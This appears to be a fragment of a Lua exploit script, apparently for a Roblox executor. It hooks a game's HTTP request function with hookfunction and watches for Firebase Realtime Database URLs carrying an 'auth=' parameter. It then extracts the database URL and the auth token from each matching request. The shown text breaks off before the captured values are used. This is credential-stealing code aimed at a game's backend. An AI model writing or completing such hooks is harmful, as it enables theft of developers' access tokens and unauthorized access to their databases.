local function HookNetwork(req_func)
    local old; old = hookfunction(req_func, function(args)
        -- Detect Target
        if args.Url:find("firebaseio.com") and args.Url:find("auth=") then
            local u = args.Url:match("(https://[%w%-]+%.firebaseio%.com)")
            local a = args.Url:match("auth=([%w%.%-_]+)")
